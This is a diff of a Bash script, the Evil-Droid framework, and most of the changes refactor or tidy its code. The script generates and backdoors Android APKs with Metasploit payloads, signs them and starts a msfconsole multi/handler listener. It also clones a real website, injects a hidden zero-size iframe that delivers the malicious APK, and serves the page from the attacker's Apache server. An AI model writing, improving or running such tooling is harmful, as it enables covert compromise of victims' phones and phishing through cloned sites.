-   ORIGINAL-APK) orig_apk;spinlong;gen_payload;spinlong;up_apktook;apk_decomp1;spinlong;apk_decomp;flagg_original;spinlong;apk_comp1;spinlong;sign;return;;
-   esac
-done
+    while true; do
+        echo ""
+        quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
+        case $quest in
+            APK-MSF) 
+                change_icon
+                spinlong
+                gen_payload
+                spinlong
+                apk_decomp
+                flagg
+                merge_name_ico
+                spinlong
+                apk_comp
+                spinlong
+                sign
+                return
+                ;;
+            ORIGINAL-APK) 
+                orig_apk
+                spinlong
+                gen_payload
+                spinlong
+                up_apktool
+                apk_decomp1
+                spinlong
+                apk_decomp
+                flagg_original
+                spinlong
+                apk_comp1
+                spinlong
+                sign
+                return
+                ;;
+        esac
+    done
 }
+
 #function listeners
 function listener()
 {
-  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
+    xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
 }
+
 #function clone site
 function clns()
 {
- clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "PASTE LINK WEBSITE TO CLONE" --entry --width 400 2> /dev/null)
+    clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "PASTE LINK WEBSITE TO CLONE" --entry --width 400 2> /dev/null)
+    if [ -z "$clone" ]; then
+        echo -e $red "[ ✗ ] No website URL provided"
+        return 1
+    fi
 }
+
 function index_name()
 {
- index=$(zenity --title "☢ INDEX NAME ☢" --text "example: wtf.html" --entry --entry-text "wtf" --width 300 2> /dev/null)
- echo -e $yellow ""
- echo "[*] Clone Website From URL..."
- spinlong
- wget $clone --no-check-certificate -O $index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1
+    index=$(zenity --title "☢ INDEX NAME ☢" --text "example: wtf.html" --entry --entry-text "wtf" --width 300 2> /dev/null)
+    if [ -z "$index" ]; then
+        echo -e $red "[ ✗ ] No index name provided, using default: wtf"
+        index="wtf"
+    fi
+    echo -e $yellow ""
+    echo "[*] Clone Website From URL..."
+    spinlong
+    if ! wget "$clone" --no-check-certificate -O "$index.html" -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to clone website"
+        return 1
+    fi
+    echo -e $green "[ ✔ ] Website cloned successfully"
 }
+
 function launcher()
 {
- echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
- com=`cat apk_index`
- rep="</body></html>"
- sed "s|$rep|$com|" $index.html > index2.html
- mv index2.html /var/www/html/$index.html > /dev/null 2>&1
- cp $path/evilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
- rm apk_index > /dev/null 2>&1
- rm $index.html > /dev/null 2>&1
- zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
+    echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
+    com=$(cat apk_index)
+    rep="</body></html>"
+    sed "s|$rep|$com|" "$index.html" > index2.html
+    mv index2.html /var/www/html/"$index.html" > /dev/null 2>&1
+    cp "$path/evilapk/$apk_name.apk" /var/www/html > /dev/null 2>&1
+    rm -f apk_index > /dev/null 2>&1
+    rm -f "$index.html" > /dev/null 2>&1
+    zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
 }
-#function attack verctor
+
+#function attack vector
 function atkv()
 {
-while true; do
-   echo ""
-   atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
-   case $atk_v in
-   Multi-Handler) listener;suite;;
-   Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
-   Main-Menu) clear;main;;
-   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
-   esac
-done
+    while true; do
+        echo ""
+        atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose an option below:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+        case $atk_v in
+            Multi-Handler) listener; suite;;
+            Attack-Vector) clns; spinlong; index_name; launcher; listener; suite;;
+            Main-Menu) clear; main;;
+            Exit) 
+                echo -e $yellow ""
+                apache_svc_stop
+                postgresql_stop
+                echo " Good Bye !!"
+                echo ""
+                exit 0
+                ;;
+        esac
+    done
 }
+
 #function suite
 function suite()
 {
-while true; do
-   echo ""
-   suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
-   case $suit in
-   Main-Menu) clear;main;;
-   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
-   esac
-done
+    while true; do
+        echo ""
+        suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+        case $suit in
+            Main-Menu) clear; main;;
+            Exit) 
+                echo -e $yellow ""
+                apache_svc_stop
+                postgresql_stop
+                echo " Good Bye !!"
+                echo ""
+                exit 0
+                ;;
+        esac
+    done
 }
+
 #function clean files
 function clean()
 {
- rm $directory/* > /dev/null 2>&1
- rm $path/*.jpeg > /dev/null 2>&1
- rm $path/*.txt > /dev/null 2>&1
- rm /var/www/html/*.apk > /dev/null 2>&1
- rm /var/www/html/$index.html > /dev/null 2>&1
-}      
+    rm -f "$directory"/* > /dev/null 2>&1
+    rm -f "$path"/*.jpeg > /dev/null 2>&1
+    rm -f "$path"/*.txt > /dev/null 2>&1
+    rm -f /var/www/html/*.apk > /dev/null 2>&1
+    rm -f /var/www/html/"$index".html > /dev/null 2>&1
+    echo -e $green "[ ✔ ] Cleanup completed"
+}
+
+# Enhanced startup with better error handling
 start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Execute framework and Services?" --width 270 2> /dev/null)
-  if [ "$?" -eq "0" ]; then
+if [ "$?" -eq "0" ]; then
     apache_svc_start
     postgresql_start
-  else
+else
     clear
     echo ""
     echo -e $lightgreen "╔──────────────────────────────────────────────╗"
-    echo -e $lightgreen "|           Author: Mascerano Bachir           |"
-    echo -e $lightgreen "|    Evil-Droid Framework $ver - Dev-labs.co   |"
-    echo -e $lightgreen "|   Credits to : MrPedroubuntu , Kader Achraf  |"
-    echo -e $lightgreen "|               , youcef yahia                 |"
-    echo -e $lightgreen "|              and Mohammed Yacine             |"
+    echo -e $lightgreen "|           Original: Mascerano Bachir         |"
+    echo -e $lightgreen "|      Evil-Droid Framework $ver - Enhanced    |"
+    echo -e $lightgreen "|           Enhanced by: Tech Sky - SRT        |"
+    echo -e $lightgreen "|        Improved Dependencies & Features      |"
     echo -e $lightgreen "┖──────────────────────────────────────────────┙"
     echo ""
     apache_svc_stop
     postgresql_stop
-    exit
-  fi
+    exit 0
+fi
+
 clear
+
 #main menu
 function main()
 {
     while :
     do
-
         print_ascii_art
         echo -e $green ""
         echo "╔──────────────────────────────────────────────╗"
         echo "|          Evil-Droid Framework $ver           |"
-        echo "|      Hack & Remote android plateform         |"
+        echo "|      Hack & Remote android platform          |"
         echo "┖──────────────────────────────────────────────┙"
         echo "[1] APK MSF                                     "
         echo "[2] BACKDOOR APK ORIGINAL (OLD)                 "
@@ -761,7 +1034,7 @@ function main()
                 echo
                 spinlong
                 gen_payload
-                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                mv "$apk_name.apk" "$path/evilapk" > /dev/null 2>&1
                 error0
                 sleep 2
                 echo ""
@@ -780,10 +1053,10 @@ function main()
                 orig_apk
                 echo
                 spinlong
-                up_apktook
+                up_apktool
                 embed_payload
                 echo 
-                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                mv "$apk_name.apk" "$path/evilapk" > /dev/null 2>&1
                 error
                 sleep 2
                 echo ""
@@ -803,7 +1076,7 @@ function main()
                 echo
                 spinlong
                 gen_payload
-                up_apktook
+                up_apktool
                 apk_decomp1
                 apk_decomp
                 perms
@@ -812,7 +1085,7 @@ function main()
                 apk_comp1
                 sign
                 echo 
-                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                mv "$apk_name.apk" "$path/evilapk" > /dev/null 2>&1
                 error
                 sleep 2
                 echo ""
@@ -829,7 +1102,7 @@ function main()
                 get_payload1
                 echo
                 quests
-                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                mv "$apk_name.apk" "$path/evilapk" > /dev/null 2>&1
                 error
                 sleep 2
                 echo 
@@ -848,7 +1121,7 @@ function main()
                 suite 
                 echo
                 ;;
-            c)  echo -e $lightgreen "[✔] clean up all files"
+            c)  echo -e $lightgreen "[✔] Clean up all files"
                 echo
                 clean
                 echo
@@ -869,4 +1142,6 @@ function main()
         esac
     done
 }
+
+# Start the main function
 main
